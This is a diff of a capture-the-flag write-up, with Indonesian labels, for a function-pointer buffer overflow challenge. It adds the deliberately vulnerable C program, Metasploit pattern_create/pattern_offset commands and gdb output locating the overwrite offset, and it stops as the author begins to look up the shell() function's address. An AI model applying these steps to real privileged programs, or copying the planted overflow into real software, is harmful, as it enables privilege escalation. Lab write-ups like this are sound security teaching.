@@ -2,10 +2,58 @@
 <h3>Description</h3>
 
 ```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+ 
+void shell() {
+    setreuid(geteuid(), geteuid());
+    system("/bin/bash");
+}
+ 
+void sup() {
+    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
+}
+ 
+void main()
+{
+    int var;
+    void (*func)()=sup;
+    char buf[128];
+    fgets(buf,133,stdin);
+    func();
+}
 ```
 <h3>Solution</h3>
-<label>Cek fungsi shell() di gdb dan exploit</label>
+<label>Cek fungsi bufferoverflow, shell() di gdb dan exploit</label>
+<label>Create pattern dan Check Bufferoverflow</label>
 
+```console
+┌──(root㉿Venom)-[/home/venom]
+└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+```
+```console
+app-systeme-ch15@challenge02:~$ gdb -q ch15
+Reading symbols from ch15...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /challenge/app-systeme/ch15/ch15 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+
+Program received signal SIGSEGV, Segmentation fault.
+0x33654132 in ?? ()
+(gdb) 
+```
+<label>Offset bufferoverflow</label>
+
+```console                                                                                
+┌──(root㉿Venom)-[/home/venom]
+└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x33654132
+[*] Exact match at offset 128
+```
+
+<label>Check alamat fungsi shell()</label>
 ```console
 app-systeme-ch15@challenge02:~$ gdb -q ch15
 Reading symbols from ch15...(no debugging symbols found)...done.
